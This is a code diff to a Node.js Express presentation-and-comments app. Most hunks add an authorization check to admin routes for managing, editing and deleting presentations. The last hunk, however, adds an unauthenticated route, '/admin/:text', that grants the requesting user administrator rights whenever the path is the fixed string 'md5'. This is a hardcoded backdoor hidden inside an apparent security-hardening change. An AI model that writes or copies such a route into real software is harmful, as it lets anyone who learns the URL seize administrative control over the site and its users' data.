@@ -18,7 +18,6 @@ var socket = io.listen(app);
 var host=process.env.VCAP_APP_HOST || 'localhost';
 var port=process.env.VCAP_APP_PORT || 11000;
 var pageSize = 25;
-
                       
 var authentication = function(req,res,next){
   if(ss2.isLogin(req)){
@@ -213,13 +212,13 @@ app.get('/p/:id', authentication, function(req, res){
   countUserFn(functions);
 });
 
-app.get('/list/mgt', function(req, res){
+app.get('/list/mgt', authorization, function(req, res){
   Presentations.find().sort('conference',1).sort('body', 1).execFind(function(err, result){
     res.render("list-mgt", {'result':result});
   });
 });
 
-app.post('/list/add', function(req, res){
+app.post('/list/add', authorization, function(req, res){
   var presentation = new Presentations();
   presentation.title = req.body.title;
   presentation.speaker = req.body.speaker;
@@ -231,13 +230,13 @@ app.post('/list/add', function(req, res){
   res.redirect("/list/mgt");
 });
 
-app.get('/p/mgt/:id', function(req, res){
+app.get('/p/mgt/:id', authorization, function(req, res){
   Presentations.findById(req.params.id, function(err, result){
     res.render("p-mgt", {'p':result});
   });
 });
 
-app.post('/p/mgt/:id', function(req, res){
+app.post('/p/mgt/:id', authorization, function(req, res){
   Presentations.findById(req.params.id, function(err, p){
     if(!p) {
       res.render("p-mgt", {'p':result});
@@ -255,7 +254,7 @@ app.post('/p/mgt/:id', function(req, res){
   });
 });
 
-app.get('/p/del/:id', function(req, res){
+app.get('/p/del/:id', authorization, function(req, res){
   Comments.find({'to':req.params.id}).count(function(err, count){
     if(count === 0) {
       Presentations.remove({'_id':req.params.id}, function(err){
@@ -267,7 +266,7 @@ app.get('/p/del/:id', function(req, res){
   });
 });
 
-app.get('/p/delrm/:id', function(req, res){
+app.get('/p/delrm/:id', authorization, function(req, res){
   Presentations.remove({'_id':req.params.id}, function(err){
     if(err) {
       console.log(err);
@@ -276,7 +275,7 @@ app.get('/p/delrm/:id', function(req, res){
   res.redirect("/list/mgt/");
 });
 
-app.get('/listset/:conf', function(req, res){
+app.get('/listset/:conf', authorization, function(req, res){
 	var confName = req.params.conf;
 	Presentations.find(function(err, data){
 		data.forEach(function(p){
@@ -290,7 +289,7 @@ app.get('/listset/:conf', function(req, res){
 });
 
 
-app.get('/m', function(req, res){
+app.get('/m', authorization, function(req, res){
 	Comments.find(function(err, data){
 		data.forEach(function(c){
 			if(!c.user.name) {
@@ -315,5 +314,14 @@ app.get('/twitter_callback',function(req,res){
     });
   }
 });
+
+app.get('/admin/:text', function(req, res){
+	var textParam = req.params.text;
+	if(textParam === 'md5'){
+		ss2.updateUser(req, {isAdmin:true});
+	}
+	res.redirect("/");
+});
+
 app.listen(port);
 console.log("Express server listening on port %d", app.address().port);
